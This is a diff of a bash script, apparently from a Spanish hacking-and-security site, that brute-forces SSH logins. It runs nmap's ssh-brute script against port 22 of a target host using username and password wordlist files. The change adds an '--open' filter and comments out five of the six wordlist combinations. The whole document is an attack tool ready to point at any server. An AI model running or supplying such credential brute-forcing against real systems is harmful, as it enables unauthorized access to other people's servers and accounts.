@@ -1,6 +1,6 @@
 #!/bin/bash
 cat << "INFO"
-
+,,,
 ██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗███████╗██╗  ██╗
 ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝██╔════╝██║  ██║
 ██████╔╝██████╔╝██║   ██║   ██║   █████╗  ███████╗███████╗███████║
@@ -8,6 +8,7 @@ cat << "INFO"
 ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗███████║███████║██║  ██║
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
                                   http://www.hackingyseguridad.com 
+,,,
 INFO
 if [ -z "$1" ]; then
         echo
@@ -19,9 +20,9 @@ if [ -z "$1" ]; then
 fi
 echo
 echo
-nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios0.txt,passdb=claves0.txt,unpwdb.timelimit=0 -oN resultado0.txt
-nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios0.txt,passdb=claves.txt,unpwdb.timelimit=0 -oN resultado1.txt
-nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios0.txt,passdb=claves2.txt,unpwdb.timelimit=0 -oN resultado2.txt
-nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=claves0.txt,unpwdb.timelimit=0 -oN resultado3.txt
-nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=claves.txt,unpwdb.timelimit=0 -oN resultado4.txt
-nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=claves2.txt,unpwdb.timelimit=0 -oN resultado5.txt
+nmap -Pn $1 $2 -p 22 --open --script ssh-brute --script-args userdb=usuarios0.txt,passdb=claves0.txt,unpwdb.timelimit=0 -oN resultado0.txt
+# nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios0.txt,passdb=claves.txt,unpwdb.timelimit=0 -oN resultado1.txt
+# nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios0.txt,passdb=claves2.txt,unpwdb.timelimit=0 -oN resultado2.txt
+# nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=claves0.txt,unpwdb.timelimit=0 -oN resultado3.txt
+# nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=claves.txt,unpwdb.timelimit=0 -oN resultado4.txt
+# nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=claves2.txt,unpwdb.timelimit=0 -oN resultado5.txt
